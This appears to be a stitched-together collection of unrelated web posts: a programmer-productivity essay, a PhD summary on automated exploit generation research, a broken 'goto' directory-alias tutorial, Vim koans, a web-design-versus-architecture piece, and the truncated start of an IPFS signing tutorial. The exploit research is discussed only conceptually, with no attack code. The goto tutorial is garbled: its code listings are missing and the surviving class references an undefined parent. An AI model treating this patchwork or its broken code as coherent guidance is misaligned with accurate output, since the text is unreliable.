<p>In the mythology of programming, a 10x programmer is a programmer that can do ten times the work of another typical programmer. The programming community is exceptionally polarized about the existence or not of such a beast. However, many people told me that they believe I’m a very fast programmer. Considering I’m far from being a workaholic, I have put together a list of qualities that I believe make the most difference in programmers’ productivity.</p>
<h2>Bare programming abilities</h2>
<p>One of the most self-evident limits or strengths of a programmer is the skill to effectively implementing the basic parts of a program: a function, an algorithm, or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently to implement something is, in my experience, not as widespread as one may think. I observed experienced yet uneducated programmers getting more work done than graduate programmers, in theory extremely competent, but very poor at implementing solutions.</p>
<h2>Focus</h2>
<p>The number of hours spent writing code is irrelevant without looking at the quality of the time. External and internal factors can cause a lack of focus. Internal factors cause procrastination. They can be things like lack of interest in the project at hand (you can’t be good at doing things you do not love), lack of exercise or well-being, and poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often, etcetera. It seems natural that trying to improve focus and to reduce interruptions is going to have a significant effect on programming productivity. Sometimes to gain focus, extreme measures are needed. For instance, I only read emails from time to time and do not reply to most of them.</p>
<h2>Design sacrifice</h2>
<p>Often complexity is generated when a non-fundamental goal of a project is accounting for a considerable amount of design complexity. In other cases, there is a design tension between a fundamental feature and a non-fundamental one, and this is making the more important goal very hard to reach.
A designer needs to recognize the parts of a design that are not easy wins or where there is no proportionality between the effort and the advantages. To execute a project maximizing the output, one needs to focus precisely on the aspects that matter, and that they can implement in a reasonable amount of time.
When designing the Disque message broker, I realized that by providing only best-effort ordering for the messages, I could substantially improve all the other aspects of the project: availability, query language, and client interaction, simplicity, and performance.</p>
<h2>Simplicity</h2>
<p>Simplicity is an obvious point that means all and nothing. It is worth to check how we often generate complexity to understand what simplicity is. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices and the accumulation of errors in the design activity.</p>
<p>If you think of the design process, each time we pursue a wrong path, we get farther and farther from the optimal solution. An initial design error, in the wrong hands, is not corrected with a re-design of the same system. It leads to the design of another complex solution to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.</p>
<p><img src="https://imgur.com/qPJakrY.png" alt="simplicity"></p>
<p>We can achieve simplicity by thinking in terms of small mental “proofs of concept” so that we can explore a large number of simple designs with our minds. This technique allows us to start working from something that looks like the most viable and direct solution. Later, experience and personal design abilities allow us to improve the design and find sensible solutions for the sub-design issues that we need to resolve.</p>
<p>However, each time a complex solution seems to be warranted, it’s essential to think deeply about how to avoid this complexity. Only continue in that direction as the last resort, even considering completely different design alternatives.</p>
<h2>Perfectionism</h2>
<p>Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and a personality trait. In both instances, I see this as one of the most significant barriers for a programmer to deliver things fast. Perfectionism and fear of external judgment bias us to refine a design only according to psychological or trivially measurable parameters. Instead, we tend to forget things like robustness, simplicity, ability to deliver in time. </p>
<h2>Knowledge</h2>
<p>When dealing with complex tasks, knowledge of data structures, fundamental limits of computation, non-trivial algorithms is going to have an impact on the ability to find a suitable design. It is not necessary to be a super expert in everything. Still, it is essential to be at least aware of a multitude of potential solutions for a problem. For example, it is possible to use algorithms which are very efficient at counting unique items in a stream, if we can accept some error percentage. Not everyone is familiar with them.</p>
<h2>Low-level understanding of the machine</h2>
<p>Many issues in programs, even when using high-level languages, arise from the misunderstanding of how the computer is going to perform a given task. Sometimes, this may lead to re-designing and re-implementing a tool from scratch because there is a fundamental problem in the tools or algorithms used. High competence in C, understanding of how CPUs work, and knowledge of how the kernel and system calls are implemented, can be essential in preventing bad, late-stage surprises.</p>
<h2>Debugging skills</h2>
<p>It is surprisingly easy to spend an enormous amount of effort to find bugs. Being able to focus on a bug incrementally and to fix it with a rational set of steps, together with having to deal with simple code that is unlikely to contain too many bugs, can have a significant effect on the programmer's efficiency.</p>
<p>In conclusion, it is not surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined, they allow for proper implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call “opportunistic programming.” Basically, at every development step, the set of features to implement is chosen to have the maximum impact on the user base of the program, with the minimum requirement of efforts.</p>

<p>Over the summer I defended my PhD thesis. You can find it <a rel="noreferrer noopener" href="https://seanhn.files.wordpress.com/2020/11/heelan_phd_thesis.pdf" target="_blank">here</a>. </p>



<p>To give a super quick summary (prior to a rather verbose one ;)):</p>



<ul><li>Pre-2016 exploit generation was primarily focused on single-shot, completely automated exploits for stack-based buffer overflows in things like network daemons and file parsers. In my opinion, the architecture of such systems unlikely to enable exploit generation systems for more complex bug classes, different target software, and in the presence of mitigations. </li><li>Inspired by the success of fuzzing at bug finding, I wanted to bring greybox input generation to bear on exploit generation. As a monolithic problem exploit generation is too complex a task for this to be feasible, so I set about breaking exploit generation down into phases and implementing greybox solutions for each stage. I designed these phases to be composable, and used a template language to enable for communication of solutions between phases.  </li><li>Composable solver solutions and a human-writable template language gives two, new, powerful capabilities for an exploit generation engine: 1) “Human in the loop” means we can automate the things that are currently automatable, while allowing a human to solve the things we don’t have good solvers for, and 2) If solutions are composable, and if a mock solution can be produced for any stage, then we can solve stages out of order. This leads to efficiency gains if a solution to one stage is expensive to produce, but we can mock it out and see if such a solution would even be useful to later stages, and then come back and solve for it if it does turn out to be useful. In practice I leveraged this to assume particular heap layouts, check if an exploit can be created from that point, and only come back and try to achieve that heap layout if it turns out to be exploitable. </li><li>My belief is that the future of exploit generation systems will be architectures in which fuzzing-esque input generation mechanisms are applied to granular tasks within exploit generation, and the solutions to these problems are composed via template languages that allow for human provided solutions as necessary. Symbolic execution will play a limited, but important role, when precise reasoning is required, and other over-approximate static analysis will likely be used to narrow the search problems that both the input generation and symex engines have to consider. </li><li>You’ll find a detailed description of the assumptions I’ve made in Chapter 1, as well as an outline of some of the most interesting future work, in my opinion, in the final chapter. </li></ul>



<p><strong>Background</strong></p>



<p>I originally worked on exploit generation in 2009 (MSc thesis <a rel="noreferrer noopener" href="https://seanhn.files.wordpress.com/2017/12/thesis-heelan.pdf" target="_blank">here</a>), and the approach I developed was to use concolic execution to build SMT formulas representing path semantics for inputs that cause the program to crash, then conjoin these formulas with a logical condition expressing what a successful exploit would look like, and ask an SMT solver to figure out what inputs are required to produce the desired output. This works in some scenarios where there are limited protection mechanisms (IoT junk, for example), but has a number of limitations that prevent it from being a reasonable path to real-world automatic exploit generation (AEG) solutions. There’s the ever present issue with concolic execution that scaling it up to something like a web browser is a bit of an open problem, but the killer flaw is more conceptual, and it is worth explaining as it is the same flaw found at the heart of every exploit generation system I am aware of, right up to and including everything that participated in the DARPA Cyber Grand Challenge. </p>



<p>This earlier work (mine and others) essentially treats exploit generation as a two phase process. Firstly, they find a path to a location considered to be exploitable using a normal fuzzer or symbolic execution tool. ‘Exploitable’ almost always translates to ‘return address on the stack overwritten’ in this case, and this input is then passed to a second stage to convert it to an exploit. That second stage consists of rewriting the bytes in the original input that corrupt a function pointer or return address, and potentially also rewriting some other bytes to provide a payload that will execute a shell, or something similar. This rewriting is usually done by querying an SMT solver. </p>



<p>The conceptual flaw in this approach is the idea that a crashing input as discovered by a fuzzer will, in one step, be transformable into a functioning exploit. In reality, a crashing input from a fuzzer is usually just the starting point of a journey to produce an exploit, and more often than not the initial input leading to that crash is largely discarded once the bug has been manually triaged. The exploit developer will then begin to use it as part of a larger exploit that may involve multiple stages, and leverage the bug as one component piece. </p>



<p><strong>Open Problems Circa 2016</strong></p>



<p>From 2009 to 2016 I worked on other things, but in 2016 I decided to return to academia to do a PhD and picked up the topic again. Reviewing the systems that had participated in the DARPA CGC [3], as well as prior work, there were a few apparent interesting open problems and opportunities:</p>



<ol><li>All systems I found were focused on entirely automated exploit generation, with no capacity for tandem exploit generation with a human in the loop.  </li><li>No research I could find had yet to pick up on the notion of an ‘exploitation primitive’, which is fundamental in the manual construction of exploits, and will presumably be fundamental in any automated, or semi-automated approach. </li><li>All systems treated AEG as essentially a two step process of 1) Find a path that triggers a bug, 2) Transform that path into an exploit in one shot, rather than a multi-stage ‘programming’ problem [4]. IMO, this is the primary limitation of these systems, as mentioned above, and the reason they are not extendable to more realistic scenarios. </li><li>Nobody was really leveraging greybox input generation approaches (fuzzing) extensively, outside of the task of bug finding.</li><li>Almost all systems were still focused on stack-based overflows.</li><li>Nobody was working on integrating information leaks, or dealing with ASLR, in their exploit generation systems. </li><li>Nobody was working on language interpreters/browsers.</li><li>Nobody was working on kernels.</li></ol>



<p>It’s likely that points 5-8 are the ‘reason’ for points 1-4. Once you decide to start tackling any of 5-8, by necessity, you must start thinking about multi-stage exploit generation, having human assistance, addressing bug classes other than stack-based overflows, and using greybox approaches in order to avoid the scalability traps in symbolic execution. </p>



<p><strong>Research</strong></p>



<p>With the above in mind (I didn’t touch 6 or 8), the primary goal for my PhD was to see if I could explore and validate some ideas that I think will push forward the state of the art, and form the foundation of AEG tools in the future. Those ideas are:</p>



<ol><li>Real exploits are often relatively complex programs, with multiple distinct phases in which different tasks must be solved. Much like with ‘normal’ program synthesis, it is likely that different tasks will require different solvers. Also, by breaking the problem down we naturally make it easier to solve as long as solutions to distinct phases are composable. Thus, <strong>my first goal was to break the exploitation process down into distinct phases, with the intention of implementing different solvers for each</strong>. An interesting side effect of breaking the exploit generation task down into multiple, distinct, phases was it allowed me to integrate the idea of <strong>‘lazy’ resolution of these phases</strong>, and solve them out of order. In practice, what this meant was that if a solver for an early stage was much more expensive than a later stage then my system allowed one to ‘mock’ out a solution to the early stage, and only come back to solve it for real once it was validated that having a solution for it would actually lead to an exploit. </li><li>Once exploit generation is broken down into multiple phases, we have decisions to make about how to solve each. Symbolic execution has powered the core of most exploit generation engines, but it has terrible performance characteristics. OTOH fuzzing has proven itself to be vastly more scalable and applicable to a larger set of programs. Why hadn’t fuzzing previously taken off as a primary component of of exploit generation? Well, if you treat exploit generation as a single, monolithic, problem then the state space is simply too large and there’s no reasonable feedback mechanism to navigate it. Greybox approaches that do input generation using mutation really need some sort of gradient to scale and a scoring mechanism to tell them how they are doing. Once we have broken the problem down into phases it becomes much easier to design feedback mechanisms for each stage, and the scale of the state space at each stage is also drastically reduced. <strong>My second goal was therefore to design purely greybox, fuzzing inspired, solutions for each phase of my exploitation pipeline</strong>. I purposefully committed to doing everything greybox to see how far I could push the idea, although in reality you would likely integrate an SMT solver for a few surgical tasks. </li><li>I knew it would be unlikely I’d hit upon the best solver for each pipeline stage at a first attempt, and it’s even possible that a real solution for a particular pipeline stage might be an entire PhD’s worth of research in itself. Thus it is important to enable one to swap out a particular automated solution for either a human provided solution, or an alternate solver. <strong>My third goal was then to figure out a way to enable multiple solvers to interact, be swappable, and to allow for a human in the loop</strong>. To enable this I designed a template approach whereby each stage, and a human exploit developer, could write and update exploits in a template language that further stages could understand and process. I wrote about what …</li></ol></div></article></div>

    <main>
      <div>
        <p>The full code is available as a link in the end</p>
<h2 id="intro">Intro</h2>
<p>In this post I would like to show you how to build a simple app that manages directories with aliases.</p>
<p>What I mean by that? An app that will do the following</p>
<ul>
<li>Set aliases on a given directory</li>
<li>Navigate to that directory by calling the alias name</li>
<li>Delete or update aliases</li>
<li>Set workdir as a central goto point</li>
<li>Set bash autocompletion for our fun app</li>
</ul>
<p>When this is done you we will be able to set aliases like this</p>
<div><pre><code data-lang="bash">
<span>[</span>user@hostname<span>]</span>$ cd /some/pathA
<span>[</span>user@hostname pathA<span>]</span>$ goto set aliasNameA
<span>[</span>user@hostname pathA<span>]</span>$ cd /some/other/path
<span>[</span>user@hostname pathB<span>]</span>$ goto set aliasNameB
<span>[</span>user@hostname pathB<span>]</span>$ goto aliasNameA
<span>[</span>user@hostname pathA<span>]</span>$ 

</code></pre></div><p>Also we will be able to set a workdir that we can use as a relative point of movement</p>
<div><pre><code data-lang="bash">
<span>[</span>user@hostname<span>]</span>$ ls /some/path
dirA dirB dirC someFile ...
<span>[</span>user@hostname<span>]</span>$ goto set-pdir /some/path
<span>[</span>user@hostname<span>]</span>$ goto dirA
<span>[</span>user@hostname dirA<span>]</span>$ goto dirB
<span>[</span>user@hostname dirB<span>]</span>$  

</code></pre></div><p>We will implement this in two sections.</p>
<ul>
<li>Build the core app that will manage our aliases state</li>
<li>Create a bash script that will use the core app</li>
</ul>
<p>I am using python since it is faster to develop with and it is a standard tool used by linux engineers, and hence
python as a dependency is not an issue (for the majority of cases at least)</p>
<h2 id="core-app-for-working-with-our-state">Core App for working with our state</h2>
<p>The state app will be responsible for the following</p>
<ul>
<li>Write/Read/Update/Delete aliases to disk</li>
<li>Export aliase information back to the caller</li>
<li>List aliases</li>
</ul>
<p>First create <strong>goto</strong> directory</p>
<p>Let us create a file called <strong>state.py</strong> and start with our main class <strong>GotoState</strong></p>
<div><pre><code data-lang="python">
<span>#!/usr/bin/env python3</span>

<span>from</span> os <span>import</span> path

<span>class</span> <span>GotoState</span>(LoadConfig):
    <span>def</span> __init__(self):
        self<span>.</span>rootDir <span>=</span> path<span>.</span>dirname(path<span>.</span>abspath(__file__))
        self<span>.</span>stateEnvFile <span>=</span> self<span>.</span>rootDir <span>+</span> <span>'/.aliases.yml'</span>

<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()

</code></pre></div><p>Inside <strong>init</strong> we are exporting the <strong>rootDir</strong> with value the absolute path to the goto workdir.
The reason we did that is because we want <strong>stateEnvFile</strong> to be relative to the <strong>state.py</strong> file and not
relative to the invokation’s path.</p>
<p>Next we will add the code for creating and updating the <strong>.aliases.yml</strong> file. But before we do that, let us first
install pyyaml which will be the only dependency for this app (not considering python3, pip and bash)</p>
<p>Create a local directory called modules</p>
<p>Install pyyaml in modules</p>
<div><pre><code data-lang="bash">
pip install --target<span>=</span>modules/ pyyaml

pip3 freeze | grep <span>'PyYAML=='</span> &gt; requirements.txt

cat &gt; setup.sh <span>&lt;&lt;EOF
</span><span>pip install -r requirements.txt --target=modules/ 
</span><span>EOF</span>
</code></pre></div><p>Update <strong>state.py</strong> with the following code</p>

<li>Note on lines (2 - 3) we are pushing to syspath.index 0 our local modules</li>
<li>On lines (11 - 25) we define the classfunction that will read and update our state file</li>
<li>On lines (33 - 43) we simply check if the file exists, in cases it does not we create it and populate it with a directory</li>
</ul>
<p>Now that we have the code to create and update our state file we can add some methods to work with it</p>
<p>First we will add the <strong>add</strong> method for inserting new items in the state file</p>

<p>Initially we define <strong>check_paths</strong> method which simply trims any trailing / from the path.
The condition is there because the method will also be called from the caller sometimes, therefore we need
to send a result back.</p>
<p>Then we define the <strong>add</strong> method which simple calls <strong>check_paths</strong> and then updates the state file with the gievn path</p>
<p>To test this, first add the following in the <strong><strong>name</strong> == <strong>main</strong></strong> section at the end</p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:

<p>The reason I decided to join the alias name and its path with <strong>::::</strong> is in order to make the caller able
to split the string and easily derive the name and path. There is no special perpuse for selecting <strong>::::</strong>,
I just did.</p>
<p>Also add the respective if condition under <strong><strong>main</strong></strong></p>

<h2>Master Wq and the Windows developer</h2>

<p>Master Wq was addressing some Vim novices. After his lecture on the many
virtues of Vim, he asked if there were any questions. A young man raised his
hand.</p>

<p>“Master, by what means might one filter for the second column of a plaintext
table for all rows that contain the string ‘tcp’?”</p>

<p>Master Wq said nothing, turned to the whiteboard behind him, and wrote:</p>

<pre><code>:%!awk '/tcp/{print $2}'
</code></pre>

<p>There was a murmur of approval from the other students.</p>

<p>“But I develop on Windows … ” the student stammered.</p>

<p>Master Wq turned again, erased the command, and wrote:</p>

<pre><code>:v/tcp/d
:v/^\s*\S\+\s\+\(\S\+\).*/d
:%s//\1/
</code></pre>

<p>“What! That is far too complex for such a simple task!” cried the student.</p>

<p>Master Wq turned again, erased the command, and wrote:</p>

<pre><code>Microsoft Excel
</code></pre>

<p>At once, the student was enlightened.</p>

<hr>

<h2>No ultimate difference</h2>

<p>One day a monk visited Master Wq, and inquired, “Master, how will my code be
different when I have mastered Vim?”</p>

<p>Master Wq answered, “Before Vim: declare, define, process, print. After Vim:
declare, define, process, print.”</p>

<hr>

<h2>Master Wq and the Markdown acolyte</h2>

<p>A Markdown acolyte came to Master Wq to demonstrate his Vim plugin.</p>

<p>“See, master,” he said, “I have nearly finished the Vim macros that translate
Markdown into HTML. My functions interweave, my parser is a paragon of
efficiency, and the results nearly flawless. I daresay I have mastered
Vimscript, and my work will validate Vim as a modern editor for the enlightened
developer! Have I done rightly?”</p>

<p>Master Wq read the acolyte’s code for several minutes without saying anything.
Then he opened a Markdown document, and typed:</p>

<pre><code>:%!markdown
</code></pre>

<p>HTML filled the buffer instantly. The acolyte began to cry.</p>

<hr>

<h2>Master Wq and the Unix master</h2>

<p>An old Unix master came to Master Wq. “I am troubled, Wq. You teach the way of
Vim. vi is holy but Vim is not; its code sprawls, its features crowd memory;
its binaries are vast, its behavior inconsistent. This is not the way of Unix.
I fear you mislead your students. What can be done?”</p>

<p>Master Wq nodded. “You are right,” he said. “Vim is broken. Let us fix it.
Shall we begin?”</p>

<p>The old Unix master agreed, and opened a shell. He typed:</p>

<pre><code>$ vi vim.c
</code></pre>

<p>He began to code. Master Wq watched for a while and then asked him, “Which
implementation of vi are you using? Nvi? Vim? Elvis?”</p>

<p>“I don’t know,” said the Unix master. “It doesn’t matter.”</p>

<p>Master Wq nodded. The Unix master sat stunned for a moment and closed his
document unsaved.</p>

<hr>

<h2>No greatest tool</h2>

<p>One night there was a storm, and Master Wq’s house collapsed. The next morning
he began to build it again using his old tools. His novice came to help him,
and they built for a while and were making good progress. As they worked, the
novice began to tell Master Wq of his latest accomplishments.</p>

<p>“Master, I have developed a wonderful Vim script to give all sorts of useful
information about a document. It counts the words, the sentences, the
paragraphs, and even tells you what kind of document it is using the syntax
highlighting rules. I use it in my pipelines all the time. It is a thing of
beauty, and I am very proud. Truly, Vim is the greatest tool!”</p>

<p>Master Wq did not reply. Thinking he had unwittingly angered his master, the
novice fell silent and continued his work.</p>

<p>The novice finished aligning two beams and had positioned a nail ready for
beating into the wood, but found the hammer was out of reach.</p>

<p>“Would you pass me the hammer, master?”</p>

<p>Master Wq handed the novice a saw.</p>

<p>At once, the novice was enlightened.</p>

<hr>

<h2>Master Pope’s dream</h2>

<p><a href="https://github.com/tpope">Master Pope</a> once dreamt he was an Emacs user. When he awoke, he exclaimed:</p>

<p>“I do not know if I am Tim Pope dreaming I am an Emacs user, or an Emacs
user dreaming I am Tim Pope!”</p>

<hr>

<h2>The superior editor</h2>

<p><a href="http://vimcasts.org/">Master Neil</a> and <a href="http://derekwyatt.org/">Master Wyatt</a> were famous for their instruction in the
ways of Vim, and travelled around the country teaching.</p>

<p>One day a student asked them, “Master Neil speaks calmly and evenly, his accent
carefully lilting over his words, as though planned down to the syllable. But
Master Wyatt is full of enthusiasm, he starts and stops, his speech is rapid
and energetic, and his soul flows into his lectures. Which is the superior way
of teaching Vim?”</p>

<p>Masters Neil and Wyatt answered in unison, “Which is the superior editor: vi or
ex?”</p>

<p>At once, several students were enlightened.</p>

<hr>

<h2>The slow student’s despair</h2>

<p>Master Wq was eating his luncheon when a student burst into his room and knelt
at his feet. Tears were in his eyes and he seemed profoundly frustrated. Master
Wq put down his bowl and asked, “What upsets you so, young man?”</p>

<p>“Master,” he said. “I give up. I will never attain mastery of Vim! I will never
learn the ways of the great patriarchs! I will never attain the brutal
simplicity, the divine emptiness of perfectly efficient Vim usage!”</p>

<p>“Why do you say this?”</p>

<p>“I am your worst student, by far. When I am struggling with writing a simple
macro, my fellow students are writing recursive macros with ease. When I am
trying to remember the regular expression for white space characters, my fellow
students are writing cyclomatic complexity tests in Vimscript. I am too slow,
and I am ashamed, and I am afraid I have failed.”</p>

<p>Master Wq stood up. “Come with me to the window,” he said.</p>

<p>The student got up and followed Master Wq to the window, and looked across the
street to Master Wq’s neighbour’s house. Through the window, the two could see
a young man in suit and tie, working on a document.</p>

<p>“What do you see?” asked Master Wq. The student watched for a while.</p>

<p>“That young man is using Microsoft Excel to generate a spreadsheet. He is
updating every single cell by hand. He doesn’t even know how to use formulas.
He makes capital letters by pressing Caps Lock, and then pressing it again when
he is done. He is so slow! I do not understand. How can he be so content?”</p>

<p>“Seeing this young man, how can you not be?” returned Master Wq.</p>

<p>The student was immediately enlightened. His name was Qa, and he later became
one of the great masters.</p>

<hr>

<h2>Mastery of Vimscript</h2>

<p>A student enquired of Master Wq, “When will I know I have mastered Vimscript?”</p>

<p>Master Wq answered, “When you never use it.”</p>

<hr>

<h2>The Vim poet</h2>

<p>A young man begged an audience with Master Wq to read him his latest work, an
ode to the glories of Vim. With tearful eyes he read out his heartfelt words,
pouring his soul into his veneration for his text editor.</p>

<p>The master sat and listened to the poet for a while. After the tenth verse, he
held up his hand. “Please, no more. Your poem is awful.”</p>

<p>The young man was very angry.</p>

<p>“Master Wq, surely you of all people can best appreciate the poem, you who know
the great beauty of the editor. How can you be so terse, so dismissive? I even
wrote this poem in Vim!”</p>

<p>“You wrote it in Vim,” said the Master. “But your meter is uneven, your rhyming
pattern inconsistent, your metaphors mixed. You have written a very bad poem
using a very good tool. You are not a poet, and Vim will not make you one; many
of my students are not programmers, and Vim will not help them either.”</p>

<p>“Vim is eternally beautiful,” protested the poet. “It is a worthy subject for
an ode.”</p>

<p>“Vim is not permanent. nvi is not permanent. vi itself is not permanent, only
vi-nature. Emacs has vi-nature, nano has vi-nature, even Notepad has vi-nature.
You narrow your sights, you grow attached, and hence you do not grasp the true
value of your poem’s subject. You must leave. Come back when you have mastered
Emacs.”</p>

<p>The poet left, deeply ashamed. He never returned.</p>

<h2>Master Wq’s missing name</h2>

<p><em>Contributed by Rafael Beraldo.</em></p>

<p>One afternoon, Master Wq was meditating under a pine tree. He contemplated how
easily the wind moves through leaves and trunks, both moving them and having
its course altered by their presence. A student approached and nervously stood
by. Having finally mustered all the courage she could, the student said:</p>

<p>“Master Wq, I am troubled by what I have seen.”</p>

<p>The Master looked at her face, and she continued:</p>

<p>“I have mastered movement, I have understood macros, I am familiar with the
source and have not touched vimscript. I have followed your every advice,
ruminated on every teaching. Yet, there is something I cannot understand.
Nowhere in Vim have I found your name. Never has anybody thanked you in the
help pages. How can that be? The greatest of all Vim masters, unknown to all?
In a desperate last try, I ran :Wq and the terminal screamed at me:</p>

<pre><code>E492: Not an editor command: Wq.
</code></pre>

<p>My heart is drowned in doubt, and I am ashamed to admit that.”</p>

<p>Master Wq looked away. After a few moments, he said:</p>

<p>“You think you have committed a great sin. However, the breeze still follows
its path, the leaves make their usual sound and the sky is no greyer.”</p>

<p>As the great master spoke this, with a sharp pebble he wrote in the dirt:</p>

<pre><code>command! Wq wq
</code></pre>

<p>From pixels to bricks, Figma to CAD, Bootstrap to brutalist, it’s easy to see similarities between web design and architecture — both are the process and product of structural elements we see on the daily, the former digital, and the latter physical. They are functional, with space for creativity and the potential to inspire and invoke feelings.</p>
<p>In this post, we chronologically examine the history of web design through the lens of architecture.</p>
<p><strong>Disclaimer</strong>: While I do try to find one-to-one mappings between the two fields, it’s definitely not perfect! I have no formal design background, and have only taken one intro college class to architecture. So it’s not that serious 😛</p>
<h2 id="html----classical"><a href="#html----classical" aria-label="html    classical permalink"></a>HTML — Classical</h2>
<p>We start our journey with inception of course. It’s only appropriate that we compare the first bare-bones HTML with the classical Greek style.</p>

<p>The first web page went live in 1992. It was written in HTML and completely text-based, with only blue hyperlinks. Much like its ancient Greek counterpart, the first web pages served as the foundation for web design to come.</p>
<h2 id="flash----renaissance"><a href="#flash----renaissance" aria-label="flash    renaissance permalink"></a>Flash — Renaissance</h2>
<p>The Renaissance was the rebirth of art and culture following the Dark Ages. Similarly, Flash was the golden age of animation.</p>

<p>With Flash, designers could create any animation they imagined. It ushered in an entirely new era of web design. However, Flash’s inefficiency, inaccessibility, and lack of support for SEO, caused its downfall.</p>
<h2 id="css----beaux-arts"><a href="#css----beaux-arts" aria-label="css    beaux arts permalink"></a>CSS — Beaux-Arts</h2>
<p>Shortly after the introduction of Flash, Cascading Style Sheets came about. It brought about structure, just like the axis-aligned Beaux-Arts style.</p>

<p>Taught primarily at the École des Beaux-Arts in Paris, Beaux-Arts was characterized by order, formality, and decoration. Thus it seems appropriate to compare it to CSS.</p>
<h2 id="flatmaterial----modern"><a href="#flatmaterial----modern" aria-label="flatmaterial    modern permalink"></a>Flat/Material — Modern</h2>
<p>The Modern movement culminated in the International Congresses of Modern Architects (CIAM) where the most influential modernist architects met with the goal of spreading the principles of the movement. This reminds me of the period that we’ve been in the for the past decade or so — flat (aka everything looks the same).</p>

    </span><em>Villa Savoye</em></p>
<p>Influential Modern architect Le Corbusier published a manifesto in his book <em>Vers une architecture</em> which summarized five key aspects of the modern style. The Villa Savoye shown above most embodies these characteristics.</p>
<p><strong>Le Corbusier’s <a href="https://www.lescouleurs.ch/en/journal/posts/the-five-points-of-a-new-architecture/" target="_blank">Five Points of New Architecture</a> (1927)</strong>:</p>
<ul>
<li><strong>Pilotis</strong>: columns instead of load-bearing walls</li>
<li><strong>Free facade</strong>: reducing separation between indoors and outdoors</li>
<li><strong>Free plan</strong>: flexible use of living space</li>
<li><strong>Horizontal windows</strong>: natural and equal lighting</li>
<li><strong>Roof gardens</strong>: for domestic purposes as well as protection for the concrete roof</li>
</ul>
<p>I made my own manifest to create a generic flat modern site. Each point roughly corresponds to one of Le Corbusier’s above in the same order.</p>
<p><strong>Karen’s Five Points of Flat Design</strong>:</p>
<ul>
<li><strong>Invisible design elements</strong>: hover and load effects</li>
<li><strong>White space</strong>: to guide the viewer’s eye towards the most important elements</li>
<li><strong>Responsiveness</strong>: mobile-compatible designs for smartphones and tablets</li>
<li><strong>Cards</strong>: to organize and separate information easily</li>
<li><strong>Accent colors/gradients</strong>: to emphasize action buttons and provide cohesion and branding</li>
</ul>
<p>Most modern sites are flat. And most flat sites hit the five key points above (can you spot all five in Scale AI’s <a href="https://scale.com/" target="_blank">site</a>?).</p>
<p>If you think that every site looks the same nowadays, you are not wrong. That’s exactly how Postmodern architects felt, eventually creating a style that countered the sameness from the Modern movement.</p>

<p>Jokes aside, Bootstrap remains popular for its ease-of-use, responsiveness, and functionality. It makes sense to compare it to Brutalism, where its minimalism highlights raw materials and structural design over decorative details.</p>

<p>Apple’s current <a href="https://www.apple.com/" target="_blank">site</a> isn’t exactly flat. It feels much more immersive and it reminds me of deconstructivism — an absence of harmony, continuity, or symmetry. I can’t find a word beside <em>futuristic</em> to describe this experience. I’m excited to leave flat design behind. I think it’s time, don’t you?</p>

                <div>
                    <p>Storing authenticated and encrypted data on <a href="https://ipfs.io/">IPFS</a> is a core building block for many Web3 applications, but to date there has not been a standardized way to encode this type of data.</p><p>Without a standard, many developers have been forced to create custom formats for their signed and encrypted data. This has been prohibitive to the openness and interoperability of information stored in IPFS by siloing data to their particular implementation. Another approach to authenticated data has been to put data in IPFS and put the CID of the data in a smart contract on a blockchain, such as <a href="https://ethereum.org/">Ethereum</a>. This is essentially an expensive way of adding a signature on top of the data and persisting the signature record on the blockchain.</p><p>With the introduction of <strong><a href="https://eips.ethereum.org/EIPS/eip-2844">EIP-2844</a>,</strong> a standard that allows wallets to support a few new methods for signing and decrypting data based on <a href="https://www.w3.org/TR/did-core/">DIDs</a> and the <strong><a href="https://github.com/ipld/specs/pull/269"><code>dag-jose</code></a></strong> IPLD codec, we can now simply put authenticated and encrypted data directly into IPFS. In this tutorial, you will learn how you can utilize these primitives with two libraries, <a href="https://github.com/ceramicnetwork/js-did"><code>js-did</code></a> and <a href="https://github.com/3box/3id-connect"><code>3ID Connect</code></a>!</p><h2 id="what-are-dids-and-jose">What are DIDs and JOSE?</h2><p><strong>DIDs</strong> is the W3C standard for <em>Decentralized Identifiers</em>. It specifies a general way of going from a string identifier, e.g. <code>did:3:bafy...</code>, to a <em>DID document</em> which contains public keys for signature verification and key exchange. In most DID methods the document can be updated when keys are rotated for security reasons.</p><p><strong>JOSE</strong> is a standard from <a href="https://www.ietf.org/standards/">IETF</a> which stands for <em>JSON Object Signing and Encryption,</em> and that pretty much explains what it is. There are two main primitives in this standard: JWS (JSON Web Signatures) and JWE (JSON Web Encryption). Both of these formats allow for multiple participants: in JWS there can be one or multiple signatures over the payload, and in JWE there might be one or multiple recipients for the encrypted cleartext.</p><h2 id="building-with-dag-jose-and-eip2844">Building with dag-jose and EIP2844</h2><p>As we have been building out <a href="https://ceramic.network/">Ceramic</a> with <strong>dag-jose</strong> and <strong>EIP-2844</strong> as basic building blocks, we've created a few lower-level tools which allow us to more easily use these technologies. This tutorial will show you how to use these powerful tools directly.</p><p><strong><a href="https://github.com/3box/identity-wallet-js/">IdentityWallet</a></strong> is an implementation of <strong>EIP-2844</strong> using 3ID as the DID method. It can be used standalone as a <em>DID Provider,</em> or more conveniently within the <strong><a href="https://github.com/3box/3id-connect/">3ID Connect</a></strong> library. 3ID Connect allows users to use their Ethereum wallet (support for more blockchains coming soon) to get access to a <em>DID Provider</em>.</p><p><strong><a href="https://github.com/ceramicnetwork/js-did">js-did</a></strong> is a library that allows developers to represent a user in the form of a DID. This is the main interface we're going to be looking at in this tutorial. It allows us to sign data with the currently authenticated user, encrypt data to any user (DID), and decrypt data with the currently authenticated user.</p><h2 id="signed-data-in-ipfs">Signed data in IPFS</h2><p>By using the <strong>dag-jose</strong> IPLD codec we can create data structures that are linked and signed. This is done by creating JSON Web Signatures (JWS) that contain a link to additional data. One of the main problems that the <strong>dag-jose</strong> codec solves is that the payload of a JWS is traditionally encoded as <code>base64url</code> which means that if it contains any IPLD links you can't traverse those links. Instead what we do with <em>DagJWS</em> is enforce the payload to be the bytes of a CID. The codec then transforms the payload into a CID instance and sets it to the <code>link</code> property of the <em>DagJWS. </em>This allows us to easily traverse the resulting DAG.</p><h2 id="setup-your-environment">Setup your environment</h2><p>This section will cover how to set up some specific dependencies needed for this 